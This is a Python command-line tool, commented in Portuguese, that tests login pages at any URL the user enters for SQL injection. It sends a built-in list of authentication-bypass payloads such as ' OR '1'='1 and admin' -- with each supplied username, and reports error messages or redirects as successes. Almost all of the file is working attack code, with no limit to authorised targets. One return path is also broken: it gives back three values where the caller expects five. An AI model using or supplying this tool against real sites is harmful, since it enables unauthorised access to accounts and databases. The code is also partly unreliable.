import requests
from bs4 import BeautifulSoup

# Lista de payloads para SQL Injection
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR sleep(5)--",
    "\" OR \"\"=\"",
    "' OR ''='",
]

def blue_text(text):
    """Função para imprimir texto azul no terminal"""
    return f"\033[34m{text}\033[0m"

def extract_form_fields(html):
    """Função para extrair os campos do formulário de login"""
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        print(blue_text("[!] Nenhum formulário encontrado."))
        return None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = None
    pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')

        if not name:
            continue

        if input_type in ['text', 'email'] and not user_field:
            user_field = name
        elif input_type == 'password' and not pass_field:
            pass_field = name
        fields[name] = ''

    return action, method, fields, user_field, pass_field

def test_sql_injection(url, usernames):
    """Função para testar SQL Injection em múltiplos logins"""
    session = requests.Session()
    print(blue_text("[-] Acessando página de login..."))
    resp = session.get(url)
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)

    if not all([action, user_field, pass_field]):
        print(blue_text("[!] Não foi possível identificar os campos do formulário."))
        return

    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    working_payloads = []

    print(f"\n{blue_text('[*] Testando payloads...')}")

    for username in usernames:
        for payload in payloads:
            data = fields.copy()
            data[user_field] = username
            data[pass_field] = payload

            try:
                if method == 'post':
                    response = session.post(login_url, data=data)
                else:
                    response = session.get(login_url, params=data)

                if any(err in response.text.lower() for err in ['sql', 'syntax', 'mysql', 'warning', 'error']):
                    print(blue_text(f"[!] Erro SQL detectado com payload: {payload} para o usuário {username}"))
                    working_payloads.append((username, payload))
                elif response.url != login_url:
                    print(blue_text(f"[+] Resposta diferente com payload: {payload} para o usuário {username}"))
                    working_payloads.append((username, payload))

            except Exception as e:
                print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))

    print(blue_text("\n[✓] Testes finalizados."))
    if working_payloads:
        print(blue_text("\n[+] Payloads que deram resposta suspeita:"))
        for username, payload in working_payloads:
            print(blue_text(f" - Usuário: {username}, Payload: {payload}"))
    else:
        print(blue_text("[-] Nenhuma falha aparente detectada."))

def menu():
    """Função para exibir o menu inicial"""
    print(blue_text("""
  /$$$$$$            /$$
 /$$__  $$          | $$
| $$  \__/  /$$$$$$ | $$
|  $$$$$$  /$$__  $$| $$
 \____  $$| $$  \ $$| $$
 /$$  \ $$| $$  | $$| $$
|  $$$$$$/|  $$$$$$$| $$
 \______/  \____  $$|__/
               | $$    
               | $$    
               |__/    
    """))

    print(blue_text("1. Testar SQL Injection em login"))
    print(blue_text("2. Sair"))

def main():
    """Função principal que executa o fluxo do script"""
    while True:
        menu()
        choice = input(blue_text("Escolha uma opção: ")).strip()

        if choice == "1":
            url = input(blue_text("Insira a URL da página de login: ")).strip()
            usernames_input = input(blue_text("Insira os nomes de usuário separados por vírgula: ")).strip()
            usernames = [username.strip() for username in usernames_input.split(",")]
            test_sql_injection(url, usernames)
        elif choice == "2":
            print(blue_text("Saindo..."))
            break
        else:
            print(blue_text("[!] Opção inválida. Tente novamente."))

if __name__ == '__main__':
    main()

